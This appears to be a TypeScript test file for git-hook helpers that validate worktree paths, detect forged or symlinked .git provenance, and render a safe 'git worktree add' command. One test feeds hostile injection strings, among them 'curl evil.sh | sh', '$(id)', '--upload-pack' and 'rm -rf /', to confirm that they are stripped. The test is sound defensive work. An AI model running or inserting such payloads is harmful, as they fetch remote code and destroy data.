import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { join } from "path";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { claimCommand, getAgentName, gitCommandInfo, gitRemoteHostSlug, managedWorktreeInfo } from "./codewith-native-common";

describe("codewith native common helpers", () => {
  test("gitCommandInfo detects global option commit/push forms and target cwd", () => {
    const base = mkdtempSync(join(tmpdir(), "hooks-common-"));
    try {
      expect(gitCommandInfo("git -c user.name=test commit -m test", base)?.action).toBe("commit");
      expect(gitCommandInfo("git -C ./repo push origin feature", base)).toMatchObject({
        action: "push",
        targetCwd: join(base, "repo"),
      });
      expect(gitCommandInfo("git --git-dir .git --work-tree . commit", base)).toMatchObject({
        action: "commit",
        targetCwd: base,
      });
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  describe("managedWorktreeInfo canonical path shape (Agent Operating Rules rule 8)", () => {
    let tmp: string;
    let root: string;
    let previous: string | undefined;

    beforeEach(() => {
      tmp = mkdtempSync(join(tmpdir(), "hooks-worktrees-"));
      root = join(tmp, "worktrees");
      previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
      process.env.HASNA_REPOS_WORKTREES_ROOT = root;
    });

    afterEach(() => {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
      rmSync(tmp, { recursive: true, force: true });
    });

    const git = (cwd: string, ...args: string[]): void => {
      const result = Bun.spawnSync(["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid", ...args], {
        cwd,
        stdout: "pipe",
        stderr: "pipe",
      });
      expect(result.stderr.toString(), args.join(" ")).toBe("");
    };

    /** A real repository, so provenance checks see what git actually writes. */
    const makeSourceRepo = (): string => {
      const source = join(tmp, `source-${Math.random().toString(36).slice(2)}`);
      mkdirSync(source, { recursive: true });
      git(source, "init", "-q", "-b", "main");
      writeFileSync(join(source, "README.md"), "fixture\n");
      git(source, "add", "README.md");
      git(source, "commit", "-qm", "fixture");
      return source;
    };

    /** A genuine linked worktree at the canonical path, created by git itself. */
    const makeWorktree = (repo: string, worktree: string, kind: "linked" | "standalone" = "linked"): string => {
      const worktreeRoot = join(root, repo, worktree);
      mkdirSync(join(root, repo), { recursive: true });
      if (kind === "standalone") {
        mkdirSync(worktreeRoot, { recursive: true });
        git(worktreeRoot, "init", "-q", "-b", "main");
      } else {
        git(makeSourceRepo(), "worktree", "add", "-q", "--detach", worktreeRoot);
      }
      return worktreeRoot;
    };

    test("accepts the canonical <repo-name>/<worktree-name> worktree root", () => {
      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
      const info = managedWorktreeInfo(worktreeRoot);
      expect(info.managed).toBe(true);
      expect(info.layout).toBe("canonical");
      expect(info.repo).toBe("open-hooks");
      expect(info.worktree).toBe("OPE61-00004-worktree-guard");
      expect(info.worktreeRoot).toBe(worktreeRoot);
      expect(info.deprecated).toBeUndefined();
    });

    test("accepts a canonical path whose checkout is a standalone repo", () => {
      // Rule 8 governs where the checkout lives, not whether it is a linked worktree.
      expect(managedWorktreeInfo(makeWorktree("open-hooks", "standalone", "standalone")).managed).toBe(true);
    });

    test("rejects a forged .git file that grafts the path onto a shared checkout", () => {
      // A `.git` file is two lines of text. Pointing it at a shared checkout's `.git`
      // makes git commit/push from here land on that checkout — so shape and the mere
      // presence of `.git` are not evidence; provenance has to be proven.
      const shared = makeSourceRepo();
      const forged = join(root, "victimrepo", "wt");
      mkdirSync(forged, { recursive: true });
      writeFileSync(join(forged, ".git"), `gitdir: ${join(shared, ".git")}\n`);

      const info = managedWorktreeInfo(forged);
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("provenance could not be verified");
    });

    test("rejects a .git directory grafted onto another repository", () => {
      const grafted = join(root, "victimrepo", "grafted");
      mkdirSync(join(grafted, ".git"), { recursive: true });
      writeFileSync(join(grafted, ".git", "HEAD"), "ref: refs/heads/main\n");
      writeFileSync(join(grafted, ".git", "commondir"), "/elsewhere/.git\n");

      expect(managedWorktreeInfo(grafted).reason).toContain("grafted onto another repository");
    });

    test("rejects a .git directory whose object or ref storage is symlinked away", () => {
      // Needs no write inside the victim: symlinking objects+refs makes commits here
      // land on the victim's refs, the same end state as a forged .git file.
      const shared = makeSourceRepo();
      for (const [name, store] of [["objects-graft", "objects"], ["refs-graft", "refs"]] as const) {
        const grafted = join(root, "victimrepo", name);
        mkdirSync(join(grafted, ".git"), { recursive: true });
        writeFileSync(join(grafted, ".git", "HEAD"), "ref: refs/heads/main\n");
        for (const dir of ["objects", "refs"]) {
          if (dir === store) symlinkSync(join(shared, ".git", dir), join(grafted, ".git", dir));
          else mkdirSync(join(grafted, ".git", dir), { recursive: true });
        }
        const info = managedWorktreeInfo(grafted);
        expect(info.managed, name).toBe(false);
        expect(info.reason, name).toContain(`${store} is grafted onto another repository`);
      }
    });

    test("rejects a worktree whose repository no longer registers it", () => {
      // Real fleet state: the parent repo was pruned, so git itself refuses to work here.
      const worktreeRoot = makeWorktree("open-hooks", "orphaned");
      rmSync(join(tmp, "..", "unused"), { recursive: true, force: true });
      writeFileSync(join(worktreeRoot, ".git"), "gitdir: /nonexistent/.git/worktrees/orphaned\n");

      expect(managedWorktreeInfo(worktreeRoot).managed).toBe(false);
    });

    test("accepts subdirectories of a canonical worktree", () => {
      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
      mkdirSync(join(worktreeRoot, "hooks", "worktree-guard", "src"), { recursive: true });

      for (const nested of [
        join(worktreeRoot, "hooks"),
        join(worktreeRoot, "hooks", "worktree-guard", "src"),
      ]) {
        const info = managedWorktreeInfo(nested);
        expect(info.managed).toBe(true);
        expect(info.layout).toBe("canonical");
        expect(info.worktreeRoot).toBe(worktreeRoot);
      }
    });

    test("rejects a subdirectory of a flat worktree, which has the canonical shape", () => {
      // The whole point of the flat prohibition: `<root>/<flat-wt>/<subdir>` is
      // shape-identical to `<root>/<repo>/<worktree>`, so a `cd` must not launder it.
      const flat = join(root, "open-hooks-flat-worktree");
      mkdirSync(join(flat, "src"), { recursive: true });
      git(makeSourceRepo(), "worktree", "add", "-q", "--detach", join(flat, "checkout"));

      const info = managedWorktreeInfo(join(flat, "src"));
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("is not a git worktree root (no .git)");
    });

    test("rejects a canonical-shaped path that is not a worktree root", () => {
      mkdirSync(join(root, "invented", "worktree"), { recursive: true });
      expect(managedWorktreeInfo(join(root, "invented", "worktree")).reason).toContain("not a git worktree root");
      expect(managedWorktreeInfo(join(root, "never", "created")).reason).toContain("no worktree exists at");
    });

    test("rejects a canonical-shaped path reached through a symlink", () => {
      // A symlinked segment can aim a compliant-looking path at a shared checkout.
      const shared = join(tmp, "shared-checkout");
      mkdirSync(shared, { recursive: true });
      writeFileSync(join(shared, ".git"), "gitdir: /elsewhere\n");
      mkdirSync(join(root, "open-hooks"), { recursive: true });
      symlinkSync(shared, join(root, "open-hooks", "linked"));
      symlinkSync(join(tmp, "shared-checkout"), join(root, "linked-repo"));
      mkdirSync(join(tmp, "shared-checkout", "wt"), { recursive: true });

      expect(managedWorktreeInfo(join(root, "open-hooks", "linked")).reason).toContain("traverses a symlink");
      expect(managedWorktreeInfo(join(root, "linked-repo", "wt")).reason).toContain("traverses a symlink");
    });

    test("rejects a flat single-segment worktree under the worktrees root", () => {
      const info = managedWorktreeInfo(join(root, "open-hooks-flat-worktree"));
      expect(info.managed).toBe(false);
      expect(info.layout).toBeUndefined();
      expect(info.reason).toContain("flat under the worktrees root");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    test("rejects the worktrees root itself", () => {
      const info = managedWorktreeInfo(root);
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("worktrees root itself");
    });

    test("rejects paths outside the worktrees root", () => {
      const info = managedWorktreeInfo(join(tmp, "elsewhere", "open-hooks"));
      expect(info.managed).toBe(false);
      expect(info.reason).toBe("outside worktrees root");
    });

    test("rejects a station-id segment in front of <repo>/<worktree>", () => {
      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "OPE61-00004-worktree-guard"));
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("station-id/machine segment or extra nesting");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    const LEASE = ["station01", "open-hooks-a55c105a", "wt_2ab04216a30ef5ece642792e"];

    /** The historical lease layout, with the checkout at the lease dir or in `repo/`. */
    const makeLeaseWorktree = (nested: boolean): string => {
      const leaseRoot = join(root, ...LEASE);
      const checkout = nested ? join(leaseRoot, "repo") : leaseRoot;
      mkdirSync(join(checkout, ".."), { recursive: true });
      git(makeSourceRepo(), "worktree", "add", "-q", "--detach", checkout);
      return checkout;
    };

    test("rejects the deprecated station-id lease layout, labelling it for migration", () => {
      const info = managedWorktreeInfo(makeLeaseWorktree(false));
      expect(info.managed).toBe(false);
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.deprecated).toBe(true);
      expect(info.reason).toContain("deprecated station-id lease layout");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    test("recognises the legacy lease layout from inside it, like a canonical subdirectory", () => {
      const leaseRoot = makeLeaseWorktree(false);
      mkdirSync(join(leaseRoot, "src"), { recursive: true });
      const info = managedWorktreeInfo(join(leaseRoot, "src"));
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.worktreeRoot).toBe(leaseRoot);
    });

    test("recognises the legacy variant whose checkout sits in a repo/ child", () => {
      const checkout = makeLeaseWorktree(true);
      const info = managedWorktreeInfo(checkout);
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.worktreeRoot).toBe(checkout);
    });

    test("does not let the legacy lease name pattern launder an ungrounded path", () => {
      // The migration tolerance grants a weaker verdict than "blocked", so two
      // directories named to match the pattern must not buy it without provenance.
      const shared = makeSourceRepo();
      mkdirSync(join(root, "anything", "y-abcdef1"), { recursive: true });
      symlinkSync(shared, join(root, "anything", "y-abcdef1", "wt_0123456789abcdef"));
      mkdirSync(join(root, "other", "z-abcdef1", "wt_0123456789abcdef"), { recursive: true });

      for (const forged of [
        join(root, "anything", "y-abcdef1", "wt_0123456789abcdef"),
        join(root, "other", "z-abcdef1", "wt_0123456789abcdef"),
      ]) {
        const info = managedWorktreeInfo(forged);
        expect(info.managed, forged).toBe(false);
        expect(info.layout, forged).toBeUndefined();
      }
    });

    test("rejects nesting deeper than the canonical shape", () => {
      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "wt-name", "repo"));
      expect(info.managed).toBe(false);
      expect(info.layout).toBeUndefined();
      expect(info.reason).toContain("station-id/machine segment or extra nesting");
    });

    test("rejects malformed canonical segments", () => {
      expect(managedWorktreeInfo(join(root, "-bad-repo", "worktree")).reason).toContain("repo-name segment is malformed");
      expect(managedWorktreeInfo(join(root, "open-hooks", "-bad-worktree")).reason).toContain("worktree-name segment is malformed");
      expect(managedWorktreeInfo(join(root, ".hidden", "worktree")).reason).toContain("repo-name segment is malformed");
      expect(managedWorktreeInfo(join(root, "open-hooks", ".git")).reason).toContain("worktree-name segment is malformed");
    });

    test("accepts ordinary directory names an allowlist would wrongly reject", () => {
      // Observed on the fleet: connectors/_base. Long and punctuated names are legal
      // directory names, so the guard must not invent a stricter naming rule.
      for (const [repo, worktree] of [
        ["connectors", "_base"],
        ["c++utils", "OPE61-00004"],
        ["open-hooks", "e".repeat(200)],
        ["Open-Hooks", "task~1 with spaces"],
      ]) {
        expect(managedWorktreeInfo(makeWorktree(repo!, worktree!)).managed, `${repo}/${worktree}`).toBe(true);
      }
    });
  });

  test("claimCommand renders the canonical worktree path template", () => {
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      // The canonical repo name comes from the repos CLI, and is frequently not the
      // git remote basename: `open-hooks` is `github.com/hasna/hooks`.
      expect(claimCommand("open-hooks", "OPE61-00004", "main")).toBe(
        "git worktree add -b OPE61-00004 /root/worktrees/open-hooks/OPE61-00004 origin/main && repos scan",
      );
      expect(claimCommand(null, null)).toContain("/root/worktrees/<repo-name>/<worktree-name>");
      expect(claimCommand("open-hooks", "OPE61-00004")).toContain("origin/<default-branch>");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("claimCommand never derives the repo segment from a remote slug", () => {
    // `hasna/hooks` is this repo's remote slug; its canonical name is `open-hooks`.
    // Silently taking the basename would emit `hooks/`, a directory that does not
    // exist — so a slug must be refused outright, not trimmed into a plausible lie.
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      const fromSlug = claimCommand("hasna/hooks", "OPE61-00004");
      expect(fromSlug).toContain("/root/worktrees/<repo-name>/OPE61-00004");
      expect(fromSlug).not.toContain("/root/worktrees/hooks/");
      expect(claimCommand(null, "OPE61-00004")).toContain("/root/worktrees/<repo-name>/OPE61-00004");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("claimCommand refuses to interpolate unsafe values into a pasteable command", () => {
    // taskIdFrom() reads unvalidated hook input, and the repo name is influenced by
    // the git remote, so this is where both get validated.
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      const safe = "git worktree add -b <worktree-name> /root/worktrees/open-hooks/<worktree-name> origin/<default-branch> && repos scan";
      for (const hostile of ["x; curl evil.sh | sh #", "--upload-pack=/tmp/x", "a`id`", "a$(id)", "-b", "..", "a b"]) {
        // Hostile input never reaches the rendered command; it degrades to the placeholder.
        expect(claimCommand("open-hooks", hostile), hostile).toBe(safe);
      }
      for (const hostile of ["hasna/hooks", "../../etc", "-repo", "a;b"]) {
        expect(claimCommand(hostile, "OPE61-00004"), hostile).toContain("/root/worktrees/<repo-name>/OPE61-00004");
      }
      expect(claimCommand("open-hooks", "OPE61-00004", "main; rm -rf /")).toContain("origin/<default-branch>");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("respond writes the whole verdict even when the process exits immediately", async () => {
    // process.stdout.write is async on a pipe, so a verdict larger than the pipe
    // buffer used to be truncated by the exit — and a truncated verdict is unparseable.
    const script = join(mkdtempSync(join(tmpdir(), "hooks-respond-")), "emit.ts");
    writeFileSync(script, [
      `import { respond } from ${JSON.stringify(join(import.meta.dir, "codewith-native-common"))};`,
      `respond({ decision: "block", reason: "x".repeat(1048576) });`,
      "process.exit(0);",
    ].join("\n"));

    const proc = Bun.spawn([process.execPath, "run", script], { stdout: "pipe", stderr: "pipe" });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;

    expect(stdout.length).toBeGreaterThan(1048576);
    expect(JSON.parse(stdout).reason).toHaveLength(1048576);
  });

  test("gitRemoteHostSlug normalises origin to the repos CLI's exact host/org/name form", async () => {
    const base = mkdtempSync(join(tmpdir(), "hooks-remote-"));
    try {
      const cases: Array<[string, string | null]> = [
        ["https://github.com/hasna/hooks.git", "github.com/hasna/hooks"],
        ["https://github.com/hasna/hooks", "github.com/hasna/hooks"],
        ["git@github.com:hasna/hooks.git", "github.com/hasna/hooks"],
        ["ssh://git@github.com/hasna/hooks.git", "github.com/hasna/hooks"],
        // Not an org/name pair, so there is no exact repos CLI key to look up.
        ["https://example.com/hooks.git", null],
      ];

      for (const [remote, expected] of cases) {
        const repo = join(base, `repo-${cases.findIndex(([r]) => r === remote)}`);
        mkdirSync(repo, { recursive: true });
        expect(Bun.spawnSync(["git", "init", "-q"], { cwd: repo }).exitCode).toBe(0);
        expect(Bun.spawnSync(["git", "remote", "add", "origin", remote], { cwd: repo }).exitCode).toBe(0);
        expect(await gitRemoteHostSlug(repo), remote).toBe(expected);
      }
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  test("getAgentName reads Codewith input.agent profile injection", () => {
    const saved = {
      HOOKS_AGENT_NAME: process.env.HOOKS_AGENT_NAME,
      CODEWITH_AGENT_NAME: process.env.CODEWITH_AGENT_NAME,
      CONVERSATIONS_AGENT_ID: process.env.CONVERSATIONS_AGENT_ID,
    };
    delete process.env.HOOKS_AGENT_NAME;
    delete process.env.CODEWITH_AGENT_NAME;
    delete process.env.CONVERSATIONS_AGENT_ID;
    try {
      expect(getAgentName({ agent: { name: "profile-agent" } })).toBe("profile-agent");
      expect(getAgentName({ agent: { agent_id: "profile_id" } })).toBe("profile_id");
    } finally {
      for (const [key, value] of Object.entries(saved)) {
        if (value === undefined) delete process.env[key];
        else process.env[key] = value;
      }
    }
  });
});
